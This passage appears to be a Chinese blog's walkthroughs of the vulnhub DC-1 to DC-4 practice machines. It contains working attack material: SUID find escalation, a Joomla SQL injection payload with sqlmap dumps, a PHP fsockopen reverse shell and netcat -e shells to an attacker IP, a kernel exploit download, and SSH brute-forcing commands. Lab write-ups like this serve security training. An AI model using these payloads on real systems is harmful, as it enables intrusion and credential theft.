-4000-print2&gt;/dev/nullfind / -user root -perm -4000-exec ls -ldb {} \;</code></pre><p><img src="/images/pasted-126.png" alt="upload successful"><br>尝试查看find是否有suid权限</p><pre><code>/usr/bin/find /tmp -exec whoami  \;</code></pre><p>find 命令说明<br>-exec 参数后面跟的是command命令，它的终止是以;为结束标志的，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以前面加反斜杠。-exec参数后面跟的就是我们想进一步操作的命令,so，我们可以以root的权限命令执行了</p><p>反弹一个shell，当然find和执行命令，我们也可以返回一个root的netcat的后门</p><pre><code>/usr/bin/find ./aaa -exec &#39;/bin/sh&#39;  \;</code></pre><pre><code>/usr/bin/find ./aaa -exec netcat -lvp 4444 -e &quot;/bin/sh&quot; \;netcat 192.168.124.145 4444</code></pre><p><img src="/images/pasted-127.png" alt="upload successful"><br><img src="/images/pasted-135.png" alt="upload successful"><br>最后,获得最后一个flag</p><pre><code>cat thefinalflag.txt</code></pre><p>Well done!!!!</p><p>Hopefully you’ve enjoyed this and learned some new skills.</p><p>You can let me know what you thought of this little journey<br>by contacting me via Twitter - @DCAU7</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p>freebuf:<a href="https://www.freebuf.com/articles/network/218073.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/218073.html</a><br>知乎:<a href="https://zhuanlan.zhihu.com/p/135342104" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/135342104</a><br>W3:<a href="https://medium.com/@w3rallmachines/dc-1-vulnhub-walkthrough-3a2e7042c640" target="_blank" rel="noopener">https://medium.com/@w3rallmachines/dc-1-vulnhub-walkthrough-3a2e7042c640</a></p><h2 id="DC2"><a href="#DC2" class="headerlink" title="DC2"></a>DC2</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>靶机下载地址:<a href="http://www.five86.com/downloads/DC-2.zip" target="_blank" rel="noopener">http://www.five86.com/downloads/DC-2.zip</a></p><h3 id="基本信息收集"><a href="#基本信息收集" class="headerlink" title="基本信息收集"></a>基本信息收集</h3><p>nmap基本扫描，发现ip地址192.168.124.146，开发端口80，使用的wordpress框架</p><pre><code>nmap -A 192.168.124.0/24</code></pre><pre><code>Nmap scan report for dc-2 (192.168.124.146)Host is up (0.00036s latency).Not shown: 999 closed portsPORT   STATE SERVICE VERSION80/tcp open  http    Apache httpd 2.4.10 ((Debian))|_http-generator: WordPress 4.7.10|_http-server-header: Apache/2.4.10 (Debian)|_http-title: DC-2 &amp;#8211; Just another WordPress site|_https-redirect: ERROR: Script execution failed (use -d to debug)MAC Address: 00:0C:29:94:8C:B4 (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hop</code></pre><p>对端口进一步扫描,发现开发了7744端口(不清楚是什么服务，因该是ssh吧)：</p><pre><code>nmap -sS 192.168.124.146 -p 1-65535</code></pre><pre><code>Nmap scan report for dc-2 (192.168.124.146)Host is up (0.00094s latency).Not shown: 65533 closed portsPORT     STATE SERVICE80/tcp   open  http7744/tcp open  raqmon-pdu</code></pre><p>访问192.168.124.146发现访问不了，这里需要改下本地的dns</p><pre><code>linux:vim /etc/hostswindows:C:\Windows\System32\drivers\etc</code></pre><p><img src="/images/pasted-128.png" alt="upload successful"><br>访问果然是个wordpress框架<br><img src="/images/pasted-129.png" alt="upload successful"></p><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>发现有flag,点进去，提示用cewl来获取密码，所有应该是爆破密码之类的，且提示自己的密码字典可能无效，且有时没法获得所有密码，提示用其他的身份去登录<br><img src="/images/pasted-130.png" alt="upload successful"></p><h3 id="那还说什么cewl搞起"><a href="#那还说什么cewl搞起" class="headerlink" title="那还说什么cewl搞起"></a>那还说什么cewl搞起</h3><p>cewl是通过爬行网站获取关键信息创建一个密码字典</p><pre><code>cewl http://dc-2/index.php/flag/ -w dict.txt-w 输出的文件名称</code></pre><p>发现主题是wordpress，那就扫描一下用户吧，提示密码了，因该是让登录<br>使用wpscan工具：</p><p>WPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括主题漏洞、插件漏洞和WordPress本身的漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。<br>该扫描器可以实现获取站点用户名，获取安装的所有插件、主题，以及存在漏洞的插件、主题，并提供漏洞信息。同时还可以实现对未加防护的Wordpress站点暴力破解用户名密码。</p><p>枚举一下用户,枚举出admin，jerry，tom</p><pre><code>wpscan --url http://dc-2 --enumerate u</code></pre><pre><code>[+] URL: http://dc-2/ [192.168.124.146][+] Started: Sat Nov  7 02:23:05 2020Interesting Finding(s):[+] Headers | Interesting Entry: Server: Apache/2.4.10 (Debian) | Found By: Headers (Passive Detection) | Confidence: 100%[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: |  - http://codex.wordpress.org/XML-RPC_Pingback_API |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access[+] http://dc-2/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100%[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: |  - https://www.iplocation.net/defend-wordpress-from-ddos |  - https://github.com/wpscanteam/wpscan/issues/1299[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03). | Found By: Rss Generator (Passive Detection) |  - http://dc-2/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt; |  - http://dc-2/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;[+] WordPress theme in use: twentyseventeen | Location: http://dc-2/wp-content/themes/twentyseventeen/ | Last Updated: 2020-08-11T00:00:00.000Z | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt | [!] The version is out of date, the latest version is 2.4 | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10 | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.2 (80% confidence) | Found By: Style (Passive Detection) |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: &#39;Version: 1.2&#39;[+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:00 &lt;====================================================&gt; (10 / 10) 100.00% Time: 00:00:00[i] User(s) Identified:[+] admin | Found By: Rss Generator (Passive Detection) | Confirmed By: |  Wp Json Api (Aggressive Detection) |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection) |  Login Error Messages (Aggressive Detection)[+] jerry | Found By: Wp Json Api (Aggressive Detection) |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 | Confirmed By: |  Author Id Brute Forcing - Author Pattern (Aggressive Detection) |  Login Error Messages (Aggressive Detection)[+] tom | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</code></pre><p>爆破一下用户名和密码<br>touch users.txt<br>将用户名admin，jerry，tom存入<br>用刚刚抓取的密码字典和用户字典进行爆破</p><pre><code>wpscan --url http://dc-2/ -U users.txt -P dict.txt</code></pre><pre><code>[!] Valid Combinations Found: | Username: jerry, Password: adipiscing | Username: tom, Password: parturient</code></pre><p>成功爆破出了两个用户名和密码，没有admin的<br><img src="/images/pasted-131.png" alt="upload successful"></p><h3 id="尝试登录，登录成功，且在page中发现flag2"><a href="#尝试登录，登录成功，且在page中发现flag2" class="headerlink" title="尝试登录，登录成功，且在page中发现flag2"></a>尝试登录，登录成功，且在page中发现flag2</h3><p><img src="/images/pasted-133.png" alt="upload successful"><br>提示无法利用wordpress采取捷径，尝试令一种方法，之前nmap扫描出了7744端口，那么我们是不是可以尝试ssh登录<br>发现使用tom账号登录成功</p><pre><code>ssh tom@192.168.124.146 -p 7744password:parturient</code></pre><h3 id="尝试读取文件"><a href="#尝试读取文件" class="headerlink" title="尝试读取文件"></a>尝试读取文件</h3><p><img src="/images/pasted-134.png" alt="upload successful"><br>发现被rbash，也就是说是被受限的shell<br>参考链接:<a href="https://www.freebuf.com/articles/system/188989.html" target="_blank" rel="noopener">freebuf</a></p><p>先尝试”/“能不能用</p><p><img src="/images/pasted-136.png" alt="upload successful"><br>cp命令</p><p><img src="/images/pasted-137.png" alt="upload successful"><br>FTP,GDB,main,git没有，发现vi可以用，那就试试被</p><pre><code>vi testset shell=/bin/shshell</code></pre><p><img src="/images/pasted-138.png" alt="upload successful"></p><p><img src="/images/pasted-139.png" alt="upload successful"></p><p><img src="/images/pasted-140.png" alt="upload successful"></p><p>更改PATH或SHELL环境变量</p><pre><code>查看export -p</code></pre><pre><code>export HOME=&#39;/home/tom&#39;                                                                                                           export LANG=&#39;en_US.UTF-8&#39;                                                                                                         export LOGNAME=&#39;tom&#39;                                                                                                              export MAIL=&#39;/var/mail/tom&#39;                                                                                                       export PATH=&#39;/home/tom/usr/bin&#39;                                                                                                   export PWD=&#39;/home/tom&#39;export SHELL=&#39;/bin/rbash&#39;export SHLVL=&#39;1&#39;export SSH_CLIENT=&#39;192.168.124.139 51336 7744&#39;export SSH_CONNECTION=&#39;192.168.124.139 51336 192.168.124.146 7744&#39;export SSH_TTY=&#39;/dev/pts/1&#39;export TERM=&#39;xterm-256color&#39;export USER=&#39;tom&#39;export VIM=&#39;/usr/share/vim&#39;export VIMRUNTIME=&#39;/usr/share/vim/vim74&#39;export _=&#39;whoami&#39;</code></pre><p>修改path</p><pre><code>export PATH=&quot;/usr/sbin:/usr/bin:/rbin:/bin&quot;</code></pre><p>打开flag3.txt发现，提示要切换用户到jerry<br><img src="/images/pasted-141.png" alt="upload successful"></p><h3 id="切换用户，home发现flag4"><a href="#切换用户，home发现flag4" class="headerlink" title="切换用户，home发现flag4"></a>切换用户，home发现flag4</h3><p><img src="/images/pasted-142.png" alt="upload successful"></p><p>Good to see that you’ve made it this far - but you’re not home yet.                                                               </p><p>You still need to get the final flag (the only flag that really counts!!!).                                                       </p><p>No hints here - you’re on your own now.  :-)                                                                                      </p><p>Go on - git outta here!!!!</p><h3 id="这里提示git提权"><a href="#这里提示git提权" class="headerlink" title="这里提示git提权"></a>这里提示git提权</h3><pre><code>sudo git help config</code></pre><p><img src="/images/pasted-143.png" alt="upload successful"><br>成功获取root权限，读取文件</p><p><img src="/images/pasted-146.png" alt="upload successful"></p><p>Congratulatons!!!</p><p>A special thanks to all those who sent me tweets<br>and provided me with feedback - it’s all greatly<br>appreciated.</p><p>If you enjoyed this CTF, send me a tweet via @DCAU7.</p><h3 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/zaqzzz/p/12075132.html#1suid%E6%8F%90%E6%9D%83" target="_blank" rel="noopener">linux提权</a></p><p><a href="https://www.freebuf.com/articles/system/188989.html" target="_blank" rel="noopener">freebuf</a></p><p><a href="https://blog.csdn.net/qq_41453285/article/details/100898310" target="_blank" rel="noopener">wpscan</a></p><p><a href="https://www.cnblogs.com/yurang/p/12735229.html" target="_blank" rel="noopener"> vulnhub: DC 2</a></p><h2 id="DC3"><a href="#DC3" class="headerlink" title="DC3"></a>DC3</h2><h3 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h3><p>靶场的下载：<a href="http://www.five86.com/downloads/DC-3-2.zip" target="_blank" rel="noopener">http://www.five86.com/downloads/DC-3-2.zip</a></p><h3 id="基本信息收集-1"><a href="#基本信息收集-1" class="headerlink" title="基本信息收集"></a>基本信息收集</h3><pre><code>nmap -sS A 192.168.124.0/24</code></pre><pre><code>Nmap scan report for 192.168.124.147Host is up (0.00041s latency).Not shown: 999 closed portsPORT   STATE SERVICE VERSION80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))|_http-generator: Joomla! - Open Source Content Management|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: HomeMAC Address: 00:0C:29:EF:73:10 (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopTRACEROUTEHOP RTT     ADDRESS1   0.41 ms 192.168.124.147</code></pre><p>对端口的进一步扫描，没有发现其他的端口</p><pre><code>nmap 192.168.124.147</code></pre><p>访问192.168.124.147的80端口，发现提示，和cms是joomla<br><img src="/images/pasted-147.png" alt="upload successful"><br>使用joomscan进行进一步扫描</p><p>它是一个Joomla扫描仪。 它将帮助网络开发人员和网站管理员帮助确定已部署的Joomla网站可能存在的安全漏洞。</p><pre><code>安装joomscan(kali中)apt-get install joomscanjoomscan --url http://192.168.124.147</code></pre><p><img src="/images/pasted-148.png" alt="upload successful"><br>也可使用CMSseek进一步扫描</p><pre><code>安装CMSseekgit clone https://github.com/Tuhinshubhra/CMSeeK使用python3 cmseek.py --url 192.168.124.147</code></pre><p>信息一样<br><img src="/images/pasted-149.png" alt="upload successful"></p><h3 id="搜索joomla漏洞"><a href="#搜索joomla漏洞" class="headerlink" title="搜索joomla漏洞"></a>搜索joomla漏洞</h3><pre><code>searchsploit joomla 3.7.0</code></pre><p><img src="/images/pasted-150.png" alt="upload successful"><br>打开查看漏洞详情</p><pre><code>cat /usr/share/exploitdb/exploits/php/webapps/42033.txt </code></pre><p>查看发现存在sql注入，具体漏原理<a href="https://paper.seebug.org/305/" target="_blank" rel="noopener">seebug</a><br>简单来说就是<br>com_fields组件，对请求数据没有进行过滤，从而导致sql注入，未过滤位置<br><img src="/images/pasted-152.png" alt="upload successful"><br><img src="/images/pasted-151.png" alt="upload successful"><br>测试一下</p><pre><code>http://192.168.124.147/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x7e,database()),1)</code></pre><p><img src="/images/pasted-153.png" alt="upload successful"></p><h3 id="sqlmap进行注入"><a href="#sqlmap进行注入" class="headerlink" title="sqlmap进行注入"></a>sqlmap进行注入</h3><pre><code>爆数据库名sqlmap -u &quot;http://192.168.124.147/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x7e,database()),1)&quot; --dbs</code></pre><p><img src="/images/pasted-154.png" alt="upload successful"></p><pre><code>爆表名qlmap -u &quot;http://192.168.124.147/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x7e,database()),1)&quot; -D &quot;joomladb&quot; --tables</code></pre><p><img src="/images/pasted-155.png" alt="upload successful"></p><pre><code>爆字段名sqlmap -u &quot;http://192.168.124.147/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x7e,database()),1)&quot; -D &quot;joomladb&quot; -T &quot;#__users&quot; --columns</code></pre><p><img src="/images/pasted-156.png" alt="upload successful"></p><pre><code>爆数据sqlmap -u &quot;http://192.168.124.147/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x7e,database()),1)&quot; -D &quot;joomladb&quot; -T &quot;#__users&quot; -C name,password --dump</code></pre><p><img src="/images/pasted-157.png" alt="upload successful"></p><h3 id="尝试破解密码"><a href="#尝试破解密码" class="headerlink" title="尝试破解密码"></a>尝试破解密码</h3><pre><code>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</code></pre><pre><code>创建文件echo &#39;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#39; &gt; test爆破密码john testjohn test --show</code></pre><p>John the Ripper (“JtR”) 是一个非常有用的工具。这是一个快速的密码破解器，适用于Windows和许多Linux系统。它具有很多功能，对于很多密码破解均有奇效。</p><p><img src="/images/pasted-158.png" alt="upload successful"></p><h3 id="登录写shell页面"><a href="#登录写shell页面" class="headerlink" title="登录写shell页面"></a>登录写shell页面</h3><p>登录网站:<a href="http://192.168.124.147/administrator/" target="_blank" rel="noopener">http://192.168.124.147/administrator/</a><br>编写新页面<br><img src="/images/pasted-159.png" alt="upload successful"><br>点击编写<br><img src="/images/pasted-162.png" alt="upload successful"><br>new file编写<br><img src="/images/pasted-163.png" alt="upload successful"><br><img src="/images/pasted-165.png" alt="upload successful"></p><h3 id="蚁剑链接"><a href="#蚁剑链接" class="headerlink" title="蚁剑链接"></a>蚁剑链接</h3><p><img src="/images/pasted-166.png" alt="upload successful"></p><p><img src="/images/pasted-167.png" alt="upload successful"></p><h3 id="尝试提权"><a href="#尝试提权" class="headerlink" title="尝试提权"></a>尝试提权</h3><p>尝试suid提权</p><pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre><p>发现没有可提权程序</p><p><img src="/images/pasted-168.png" alt="upload successful"><br>尝试命令提权，发现咩用<br>尝试linux内核提权</p><pre><code>uname -acat /etc/issue</code></pre><p><img src="/images/pasted-170.png" alt="upload successful"><br>寻找内核提权脚本</p><pre><code>searchsploit Ubuntu 16.04</code></pre><p>尝试一下<br><img src="/images/pasted-169.png" alt="upload successful"></p><pre><code>cat \usr\share\exploitdb\exploits\linux\local\39772.txt</code></pre><pre><code>Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=808In Linux &gt;=4.4, when the CONFIG_BPF_SYSCALL config option is set and thekernel.unprivileged_bpf_disabled sysctl is not explicitly set to 1 at runtime,unprivileged code can use the bpf() syscall to load eBPF socket filter programs.These conditions are fulfilled in Ubuntu 16.04.When an eBPF program is loaded using bpf(BPF_PROG_LOAD, ...), the firstfunction that touches the supplied eBPF instructions isreplace_map_fd_with_map_ptr(), which looks for instructions that reference eBPFmap file descriptors and looks up pointers for the corresponding map files.This is done as follows:        /* look for pseudo eBPF instructions that access map FDs and         * replace them with actual map pointers         */        static int replace_map_fd_with_map_ptr(struct verifier_env *env)        {                struct bpf_insn *insn = env-&gt;prog-&gt;insnsi;                int insn_cnt = env-&gt;prog-&gt;len;                int i, j;                for (i = 0; i &lt; insn_cnt; i++, insn++) {                        [checks for bad instructions]                        if (insn[0].code == (BPF_LD | BPF_IMM | BPF_DW)) {                                struct bpf_map *map;                                struct fd f;                                [checks for bad instructions]                                f = fdget(insn-&gt;imm);                                map = __bpf_map_get(f);                                if (IS_ERR(map)) {                                        verbose(&quot;fd %d is not pointing to valid bpf_map\n&quot;,                                                insn-&gt;imm);                                        fdput(f);                                        return PTR_ERR(map);                                }                                [...]                        }                }                [...]        }__bpf_map_get contains the following code:/* if error is returned, fd is released. * On success caller should complete fd access with matching fdput() */struct bpf_map *__bpf_map_get(struct fd f){        if (!f.file)                return ERR_PTR(-EBADF);        if (f.file-&gt;f_op != &amp;bpf_map_fops) {                fdput(f);                return ERR_PTR(-EINVAL);        }        return f.file-&gt;private_data;}The problem is that when the caller supplies a file descriptor number referringto a struct file that is not an eBPF map, both __bpf_map_get() andreplace_map_fd_with_map_ptr() will call fdput() on the struct fd. If__fget_light() detected that the file descriptor table is shared with anothertask and therefore the FDPUT_FPUT flag is set in the struct fd, this will causethe reference count of the struct file to be over-decremented, allowing anattacker to create a use-after-free situation where a struct file is freedalthough there are still references to it.A simple proof of concept that causes oopses/crashes on a kernel compiled withmemory debugging options is attached as crasher.tar.One way to exploit this issue is to create a writable file descriptor, start awrite operation on it, wait for the kernel to verify the file&#39;s writability,then free the writable file and open a readonly file that is allocated in thesame place before the kernel writes into the freed file, allowing an attackerto write data to a readonly file. By e.g. writing to /etc/crontab, rootprivileges can then be obtained.There are two problems with this approach:The attacker should ideally be able to determine whether a newly allocatedstruct file is located at the same address as the previously freed one. Linuxprovides a syscall that performs exactly this comparison for the caller:kcmp(getpid(), getpid(), KCMP_FILE, uaf_fd, new_fd).In order to make exploitation more reliable, the attacker should be able topause code execution in the kernel between the writability check of the targetfile and the actual write operation. This can be done by abusing the writev()syscall and FUSE: The attacker mounts a FUSE filesystem that artificially delaysread accesses, then mmap()s a file containing a struct iovec from that FUSEfilesystem and passes the result of mmap() to writev(). (Another way to do thiswould be to use the userfaultfd() syscall.)writev() calls do_writev(), which looks up the struct file * corresponding tothe file descriptor number and then calls vfs_writev(). vfs_writev() verifiesthat the target file is writable, then calls do_readv_writev(), which firstcopies the struct iovec from userspace using import_iovec(), then performs therest of the write operation. Because import_iovec() performs a userspace memoryaccess, it may have to wait for pages to be faulted in - and in this case, ithas to wait for the attacker-owned FUSE filesystem to resolve the pagefault,allowing the attacker to suspend code execution in the kernel at that pointarbitrarily.An exploit that puts all this together is in exploit.tar. Usage:user@host:~/ebpf_mapfd_doubleput$ ./compile.shuser@host:~/ebpf_mapfd_doubleput$ ./doubleputstarting writevwoohoo, got pointer reusewritev returned successfully. if this worked, you&#39;ll have a root shell in &lt;=60 seconds.suid file detected, launching rootshell...we have root privs now...root@host:~/ebpf_mapfd_doubleput# iduid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user)This exploit was tested on a Ubuntu 16.04 Desktop system.Fix: https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7Proof of Concept: https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</code></pre><p>提示有exp的地址，下载</p><pre><code>https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</code></pre><p>解压上传到靶机目录，解压</p><pre><code>tar -xf exploit.tarcd ebpf_mapfd_doubleput_exploit./compile.sh</code></pre><p>先反弹一下交互形的shell<br>创建一个phpshell.php文件，写入</p><pre><code>&lt;?phpsystem(&quot;$sock=fsockopen(\&quot;192.168.124.139\&quot;,4444);exec(\&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;);&quot;);?&gt;</code></pre><p>kali端</p><pre><code>netcat -l -p 4444</code></pre><p>蚁剑执行</p><pre><code>php phpshell.php</code></pre><p><img src="/images/pasted-176.png" alt="upload successful"><br>kali收到反弹的shell</p><p><img src="/images/pasted-177.png" alt="upload successful"><br>执行刚刚编译的exp</p><p><img src="/images/pasted-178.png" alt="upload successful"><br>提权成功<br>寻找flag  root下</p><p><img src="/images/pasted-179.png" alt="upload successful"><br>成功获得flag</p><pre><code> __        __   _ _   ____                   _ _ _ _  \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |  \ \ /\ / / _ \ | | | | | |/ _ \| &#39;_ \ / _ \ | | | |   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)Congratulations are in order.  :-)I hope you&#39;ve enjoyed this challenge as I enjoyed making it.If there are any ways that I can improve these little challenges,please let me know.As per usual, comments and complaints can be sent via Twitter to @DCAU7Have a great day!!!!</code></pre><h3 id="参考文章-2"><a href="#参考文章-2" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/yurang/p/12735286.html" target="_blank" rel="noopener">https://www.cnblogs.com/yurang/p/12735286.html</a></p><p><a href="https://www.exploit-db.com/exploits/44227" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/44227</a></p><h2 id="DC4"><a href="#DC4" class="headerlink" title="DC4"></a>DC4</h2><h3 id="靶场的搭建"><a href="#靶场的搭建" class="headerlink" title="靶场的搭建"></a>靶场的搭建</h3><p>靶场下载地址:<a href="https://download.vulnhub.com/dc/DC-4.zip" target="_blank" rel="noopener">https://download.vulnhub.com/dc/DC-4.zip</a></p><h3 id="基本信息收集-2"><a href="#基本信息收集-2" class="headerlink" title="基本信息收集"></a>基本信息收集</h3><p>nmap扫描网段</p><pre><code>nmap -sS -A 192.168.124.0/24</code></pre><pre><code>Nmap scan report for 192.168.124.148Host is up (0.00022s latency).Not shown: 998 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)| ssh-hostkey: |   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)80/tcp open  http    nginx 1.15.10|_http-server-header: nginx/1.15.10|_http-title: System ToolsMAC Address: 00:0C:29:40:C9:C1 (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT     ADDRESS1   0.22 ms 192.168.124.148</code></pre><p>得到基本信息开放了80，ssh端口，操作系统Debian<br>先爆破一下ssh吧(无结果)</p><pre><code>nmap --script=ssh-brute 192.168.124.148</code></pre><p>查看80端口，发现不是cms，是个登录框，提醒admin登录<br><img src="/images/pasted-180.png" alt="upload successful"><br>尝试sql,burpsuite跑一下字典没结果，那我再跑一下看看有过滤没(我丢还是啥结果没有)，看来没有注入呀<br><img src="/images/pasted-181.png" alt="upload successful"><br><img src="/images/pasted-182.png" alt="upload successful"><br>让我百度一下题解，我丢，暴力破解密码可还行，那是时候祭出我100w的大字典了(heng!)<br>再见没爆破出来直接看答案(我一点也不happy)，看来字典有的落后了</p><pre><code>账号:admin密码:happy</code></pre><h3 id="登录进去"><a href="#登录进去" class="headerlink" title="登录进去"></a>登录进去</h3><p>尝试登录发现是个命令执行功能，抓包看看，更改一下ls，发现能读取文件，那先读取comment看看是怎么执行的<br><img src="/images/pasted-183.png" alt="upload successful"></p><p><img src="/images/pasted-184.png" alt="upload successful"><br>我丢，直接shell_exec(),那直接反弹shell</p><pre><code>nc 192.168.124.139 4444 -e /bin/bashkali端netcat -l -p 4444</code></pre><p><img src="/images/pasted-185.png" alt="upload successful"><br>反弹一下交互shell</p><pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/sh&quot;)&#39;</code></pre><p><img src="/images/pasted-187.png" alt="upload successful"></p><h3 id="发现密码"><a href="#发现密码" class="headerlink" title="发现密码"></a>发现密码</h3><p>在下面目录发现old-passwords.bak</p><p>/home/jim/backups<br>说是old密码,打开</p><pre><code>cat old-passwords.bak00000012345iloveyou1q2w3e4r5t1234123456aqwertyuiopmonkey123321dragon654321666666123myspace1a1234561212121qaz2wsx123qwe123abctinkletarget123gwerty1g2w3e4rgwerty123zag12wsx7777777qwerty11q2w3e4r987654321222222qwe123qwerty123zxcvbnm555555112233fuckyouasdfghjkl12345a1231231231q2w3eqazwsxloveme1juventusjennifer1!~!1bubblessamuelfuckoffloverscheese10123456123asd999999999madisonelizabeth1musicbuster1laurendavid1tigger1123qweasdtaylor1carlostinkerbellsamantha1Sojdlg123aljgjoshua1poopstellamyspace123asdasd5freedom1whatever1xxxxxx00000valentinaa1b2c3741852963austinmonicaqaz123lovely1music1harley1family1spongebob1stevennirvana1234abcdhellokittythomas1cooper520520muffinchristian1love13fucku2arsenal1lucky7diabloapplesgeorge1babyboy1crystal1122334455player1aa123456vfhbyfforever1Passwordwinstonchivas1sexyhockey11a2b3c4dpussyplayboy1stalkercherrytweetytoyotacreativegeminipretty1maverickbrittany1nathan1letmein1cameron1secret1google1heavenmartinamurphyspongebobuQA9Ebw445fernandoprettystartfindingsoftballdolphin1fuckmetest123qwerty1234kobe24alejandroadrianseptemberaaaaaa1bubba1isabellaabc123456password3jason1abcdefg123loveyou1shannon100200manuelleonardomolly1flowers123456z007007password.321321miguelsamsung1sergeysweet1abc1234windowsqwert123vfrcbvpoohbeard123456school1badboy951753123456c111steven1snoopy1garfieldYAgjecc826compaqcandy1sarah1qwerty123456123456leminem1141414789789mariasteelersiloveme1morgan1winnerboomerlolitanastyaalexis1carmenangelonicholas1portugalpreciousjackass1jonathan1yfnfifbitchtiffanyrabbitrainbow1angel123popcornbarbarabrandystarwars1barneynataliajibril04hiphoptiffany1shortypoohbear1simonealbertmarlborohardcorecowboyssydneyalexscorpio1234512345q12345qq123456onelovebond007abcdefg1eaglescrystal1azertyuiopwintersexy12angelinajamessvetlanafatima123456kicecreampopcorn1</code></pre><p>生成爆破字典，爆破ssh<br>使用hydra，进行爆破,hydra是著名黑客组织thc的一款开源的暴力密码破解工具，可以在线破解多种密码。 </p><pre><code>破解ssh： hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh 破解ftp： 